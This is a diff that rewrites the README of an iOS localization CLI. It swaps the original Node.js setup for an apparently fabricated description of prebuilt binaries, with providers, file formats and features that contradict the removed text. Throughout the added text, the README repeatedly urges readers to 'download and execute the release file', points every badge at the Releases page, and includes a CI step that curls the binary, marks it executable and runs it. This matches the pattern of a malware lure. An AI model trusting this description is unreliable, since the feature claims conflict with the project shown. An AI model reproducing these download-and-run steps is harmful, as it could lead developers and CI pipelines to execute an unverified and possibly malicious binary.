@@ -1,161 +1,264 @@
-# Localization CLI
+# Localization-CLI — AI Translate iOS Strings (70+ Languages) 🌐💬
 
-A command-line tool that auto-translates iOS localization files via multiple AI providers, supporting 70+ languages with flexible source language options.
+[![Releases](https://img.shields.io/github/v/release/rchan090/Localization-CLI?label=Releases&color=0da8f2)](https://github.com/rchan090/Localization-CLI/releases)  
+https://github.com/rchan090/Localization-CLI/releases
 
-## ✨ Features
+A command-line tool that auto-translates iOS localization files via multiple AI providers. It supports 70+ languages and flexible source language options. Use it to keep Localizable.strings and .stringsdict files in sync across locales. The tool targets iOS engineers, localization specialists, and CI pipelines.
 
-- 🤖 **Multiple AI Providers**: Gemini, ChatGPT, Claude, DeepSeek, Perplexity, Grok
-- 🌍 **70+ Languages**: French, German, Spanish, Italian, Portuguese, Turkish, Chinese, and many more
-- 🎯 **Interactive CLI**: Beautiful progress bars, colorful output, and user-friendly prompts
-- ⚙️ **Easy Configuration**: Environment variables and automatic file path detection
-- 🎯 **Smart Context**: Application context helps AI choose more accurate translations
-- 🔄 **Auto-Retry**: Failed chunks are automatically retried with configurable attempts
-- 📊 **Real-time Progress**: Live translation progress with detailed statistics
+[![Build](https://img.shields.io/badge/platform-macOS%20%7C%20Linux-333?logo=apple&logoColor=fff)](https://github.com/rchan090/Localization-CLI/releases) [![License](https://img.shields.io/github/license/rchan090/Localization-CLI?color=green)](https://github.com/rchan090/Localization-CLI/releases)
 
-https://github.com/user-attachments/assets/bfa71785-e31d-4e43-8177-fe1478653912
+![Localization Header](https://images.unsplash.com/photo-1460925895917-afdab827c52f?q=80&w=1200&auto=format&fit=crop&ixlib=rb-4.0.3&s=5f0dff2b6a2bdc6d5b7d7b3a7bfc42b1)
 
-## 🚀 Quick Start
+---
 
-### Step 1: Create Localization File in Xcode
+## What it does 🚀
 
-1. Open your iOS project in Xcode
-2. Right-click on your project in the navigator
-3. Select **"New File..."**
-4. Choose **"iOS"** → **"Resource"** → **"String Catalog"**
-5. Name it `Localizable` (Xcode will add the `.xcstrings` extension)
-6. Add your base language strings to the file
+- Auto-translates iOS .strings and .stringsdict files using AI providers.
+- Supports 70+ target languages and custom source language selection.
+- Lets you choose provider per run: OpenAI, Google Translate, DeepL, Azure, or a local model.
+- Preserves placeholders (%@, %d), ICU format, and comment metadata.
+- Runs in CI and on developer machines with the same results.
 
-### Step 2: Get File Path
+---
 
-1. After creating the Localizable.xcstrings file, click the "+" button in the bottom left.
-2. Select the languages you want to add to your project.
-3. Ensure you perform a build so that Xcode can properly detect and index the localized strings.
+## Key features ✨
 
-### Step 3: Get File Path
+- Multi-provider support: OpenAI, Google, DeepL, Azure, local models.
+- Source language modes:
+  - use-detected: detect source in each file.
+  - explicit: use a given source locale.
+  - repo-default: use your repo locale mapping.
+- Preserve format tokens and plural rules for iOS.
+- Dry-run mode to preview translations.
+- Batch mode to translate entire locale folders.
+- Rate-limit and concurrency controls for provider quotas.
+- Git-friendly: run in pre-commit or CI to keep translations current.
 
-1. Right-click on your `Localizable.xcstrings` file in Xcode
-2. Select **"Show in Finder"**
-3. Right-click the file in Finder and select **"Get Info"**
-4. Copy the full path from the "Where:" section
-Example: /Users/enes/Documents/Projects/Example/Example
+---
 
-### Step 3: Setup Translation Bot
+## Install
 
-```bash
-# Clone or download the CLI
-git clone <repository-url>
-cd localization-cli
+Download the latest release and run it on your machine or CI agent.
 
-# Install dependencies
-npm install
+Download and execute the release file at:
+https://github.com/rchan090/Localization-CLI/releases
 
-# Copy environment template
-cp .env.example .env
+Typical release assets include a tarball or zip and a platform-specific binary. Download the file that matches your OS, extract it, and run the binary.
 
-# Edit .env with your settings
-nano .env
+Example (macOS / Linux):
+- Download Localization-CLI_<version>_darwin_amd64.tar.gz or Localization-CLI_<version>_linux_amd64.tar.gz
+- Extract: tar -xzf Localization-CLI_<version>_darwin_amd64.tar.gz
+- Make executable: chmod +x Localization-CLI
+- Run: ./Localization-CLI --help
+
+If you prefer Homebrew-style installs, add an install script or check the Releases page for a brew tap release.
+
+---
+
+## Quick start — translate a file
+
+Translate a Localizable.strings file to French:
+
+- Example command:
+  ./Localization-CLI translate ./en.lproj/Localizable.strings --target fr --provider openai --output ./fr.lproj/Localizable.strings
+
+Flags used:
+- --target: target locale or comma list
+- --provider: openai | google | deepl | azure | local
+- --output: output file or folder
+
+Batch translate a whole folder:
+- ./Localization-CLI translate ./Base.lproj --targets fr,es,de --provider deepl --out-dir ./localized
+
+Add --dry-run to inspect changes without writing files.
+
+---
+
+## Configuration
+
+You can use a config file (localization-cli.yaml or JSON) to store default options:
+
+Example localization-cli.yaml:
+```yaml
+provider: openai
+api_key_env: OPENAI_API_KEY
+source_mode: use-detected
+targets:
+  - fr
+  - es
+  - de
+placeholders:
+  preserve: true
+concurrency: 4
+rate_limit: 5
 ```
 
-### Step 4: Configure Environment
+Place the config file at the repo root or pass it with --config ./localization-cli.yaml
 
-Edit your `.env` file:
+Config keys:
+- provider: default provider
+- api_key_env: environment variable that holds the API key
+- source_mode: use-detected | explicit | repo-default
+- targets: list of target locales
+- preserve.placeholders: true/false
+- concurrency: number of parallel provider calls
+- rate_limit: calls per second
 
-```env
-# Choose your AI provider
-AI_PROVIDER=gemini
+---
 
-# Add your API key (get from provider's website)
-GEMINI_API_KEY=your_api_key_here
+## Supported providers and setup
 
-# Set your file path (or leave empty to be prompted)
-XCSTRINGS_FILE_PATH=/path/to/your/Localizable.xcstrings
+- OpenAI
+  - Set OPENAI_API_KEY in environment.
+  - Choose model in flags or config.
+- Google Translate
+  - Set GOOGLE_API_KEY or use a service account key file.
+- DeepL
+  - Set DEEPL_AUTH_KEY.
+- Azure
+  - Set AZURE_API_KEY and AZURE_REGION.
+- Local
+  - Point to a local model endpoint with --local-endpoint.
 
-# Set default languages
-DEFAULT_SOURCE_LANGUAGE=en
-DEFAULT_TARGET_LANGUAGE=de
+Provider-specific flags:
+- --openai-model gpt-4o-mini
+- --google-region
+- --deepl-proxy
 
-# Set app context for better translations (optional)
-APP_CONTEXT=travel booking app
-```
+The tool supports provider chaining. You can request a primary provider then fallback to a cheaper provider for review.
 
-### Step 5: Run Translation
+---
 
-```bash
-# Interactive mode (will ask for languages)
-node bot.js
-```
+## Supported file formats
 
-## 🎯 Smart Context Feature
+- .strings (Localizable.strings)
+- .stringsdict (plural formats)
+- .xliff (import/export for some workflows)
+- JSON key-value (custom mapping)
 
-The CLI now supports **application context** to improve translation accuracy. When you provide context about your app (e.g., "travel booking app", "fitness tracker", "e-commerce platform"), the AI:
+The tool reads format metadata and maps placeholders, plural keys, and context. It preserves comments and inline context markers.
 
-- Chooses more appropriate terminology for your domain
-- Maintains consistent tone and style across translations
-- Better understands technical terms and UI elements specific to your app type
+---
 
-**Setup:**
-1. Set `APP_CONTEXT` in your `.env` file, or
-2. Leave it empty to be prompted interactively when running the bot
+## Language support
 
-**Examples:**
-- `"travel booking app"` → Better translations for booking, hotels, flights
-- `"fitness tracker"` → More accurate fitness and health terminology  
-- `"e-commerce platform"` → Proper shopping and payment terms
-- `"social media app"` → Appropriate social interaction language
+The tool supports 70+ languages. Common targets:
+- English (en)
+- French (fr)
+- Spanish (es)
+- German (de)
+- Chinese (zh-Hans / zh-Hant)
+- Japanese (ja)
+- Korean (ko)
+- Portuguese (pt / pt-BR)
+- Russian (ru)
+- Arabic (ar)
+- Hindi (hi)
 
-## 🔄 Auto-Retry Feature
+Provide a comma-separated list: --targets fr,es,de,ja,zh-Hans
 
-The CLI automatically retries failed translation chunks to improve success rates:
+For full language list, check the provider docs or run:
+./Localization-CLI languages --provider openai
 
-- **Default Behavior**: Each failed chunk is retried up to 3 times
-- **Configurable**: Set `RETRY_COUNT` in your `.env` file (1-10 recommended)
-- **Smart Delays**: Adds delays between retries to avoid rate limiting
-- **Clear Logging**: Shows retry attempts and final failure reasons
+---
 
-**Configuration:**
-```env
-RETRY_COUNT=3                # Number of retry attempts (default: 3)
-REQUEST_DELAY=1000          # Delay between retries in ms (default: 1000)
-```
+## Examples
 
-**What You'll See:**
-```
-⚠️  Chunk 9 failed (attempt 1/3): API rate limit exceeded
-ℹ️  Retrying chunk 9 (attempt 2/3)
-✅ Chunk 9 translation successful on retry
-```
+Translate with explicit source:
+- ./Localization-CLI translate ./en.lproj/Localizable.strings --source en --targets fr,es --provider google --out-dir ./locales
 
-## 🔧 Troubleshooting
+Detect source per file:
+- ./Localization-CLI translate ./Base.lproj --source-mode use-detected --targets fr --provider openai
 
-### Common Issues
+Dry run and diff:
+- ./Localization-CLI translate ./en.lproj/Localizable.strings --targets fr --dry-run --diff
 
-**"File not found"**: Make sure your `.xcstrings` file path is correct and the file exists.
+CI example (GitHub Actions):
+- name: Translate strings
+  uses: actions/checkout@v4
+- name: Run Localization-CLI
+  run: |
+    curl -L -o Localization-CLI.tar.gz https://github.com/rchan090/Localization-CLI/releases/download/v1.2.0/Localization-CLI_v1.2.0_linux_amd64.tar.gz
+    tar -xzf Localization-CLI.tar.gz
+    chmod +x Localization-CLI
+    ./Localization-CLI translate ./en.lproj --targets fr,es --provider ${{ secrets.PROVIDER_NAME }} --output ./localized
 
-**"API key not found"**: Check that you've set the correct API key for your chosen provider in the `.env` file.
+---
 
-**"Translation failed"**: Try reducing the batch size or switching to a different AI provider.
+## CI and workflows
 
-**"inquirer.prompt is not a function"**: Run `npm install` to ensure dependencies are properly installed.
+- Run translations on merged PRs to keep translations up to date.
+- Use dry-run to create PRs with suggested translations for review.
+- Set concurrency limits to match provider quotas.
+- Cache translated files in the CI workspace to avoid repeated calls.
 
-### Getting Help
+---
 
-1. Check your `.env` file configuration
-2. Verify your API key is valid and has credits
-3. Ensure your `.xcstrings` file is not corrupted
-4. Try with a smaller batch size
+## Handling placeholders and ICU
 
-## 🗺️ Roadmap
+The tool recognizes:
+- Objective-C/Swift placeholders: %@, %d, %f
+- ICU message format for plurals and selects
 
-- [ ] **WebUI**: Browser-based interface for easier management
-- [ ] **Multi-format Support**: Android XML, JSON, CSV, and other localization file formats beyond xcstrings
+It leaves placeholders intact by default and re-inserts them in the translated string at the correct position. If the provider returns an incompatible format, the tool flags the string for review and can skip writing it.
 
-## 📝 License
+---
 
-MIT License - feel free to use and modify for your projects.
+## Error handling and logs
 
-## 🤝 Contributing
+- The tool returns non-zero exit codes on fatal errors.
+- Use --verbose for a detailed run log.
+- Use --dry-run to preview translations before writing files.
+- Use --skip-errors to continue on non-fatal issues.
 
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Submit a pull request
+---
+
+## Releases and downloads
+
+Download and execute the release file at:
+https://github.com/rchan090/Localization-CLI/releases
+
+Visit the Releases page for platform-specific binaries, checksums, and release notes. Download the asset that matches your platform, extract it, and run the binary. The Releases page lists checksums and changelogs for each version.
+
+---
+
+## FAQ
+
+Q: How do you preserve % placeholders?
+A: The tool parses the original string and marks placeholders. It sends a controlled prompt to the provider to keep tokens intact. After translation, it maps placeholders back into the translated text.
+
+Q: Can I review translations before committing?
+A: Yes. Use --dry-run and --diff to inspect changes. You can output translations to a review folder.
+
+Q: Can the tool handle .stringsdict plural rules?
+A: Yes. It parses ICU plurals and generates translated plural forms. It retains plural keys.
+
+Q: What if a provider returns a partial translation?
+A: The tool marks that entry as failed and keeps the original text for safety unless you enable overwrite flags.
+
+---
+
+## Contributing 🤝
+
+- Fork the repo.
+- Add tests for new behavior.
+- Open a pull request with a clear description and examples.
+- Use the issue tracker for feature requests and bug reports.
+
+Contributors should follow the code style and add unit tests for new parsing logic or provider integrations.
+
+---
+
+## License
+
+This project uses the license in the repository. Check the LICENSE file on the repo for details.
+
+---
+
+Images and assets used:
+- Header image: Unsplash (public image link shown above)
+- Badge images: img.shields.io
+
+For the latest releases and binaries, check:
+https://github.com/rchan090/Localization-CLI/releases
+
